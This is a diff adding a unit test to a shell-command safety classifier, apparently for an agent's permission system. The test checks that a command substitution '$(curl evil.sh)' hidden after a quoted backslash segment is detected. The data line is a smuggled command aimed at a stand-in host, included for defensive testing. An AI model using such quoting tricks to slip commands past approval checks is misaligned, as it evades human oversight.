@@ -48,6 +48,10 @@ describe('classifyShell nested substitution', () => {
     expect(result.reason).toBe('read_only')
   })
 
+  it('detects substitution after a single-quoted segment with a literal backslash', () => {
+    expect(findCommandSubstitutions("echo 'a\\' $(curl evil.sh)")).toEqual(['curl evil.sh'])
+  })
+
   it('still denies when outer command is external alongside benign substitution', async () => {
     const result = await classifyShellCore('git push origin main $(git status)', cwd, repoRoot)
     expect(result.verdict).toBe('deny_pending_approval')
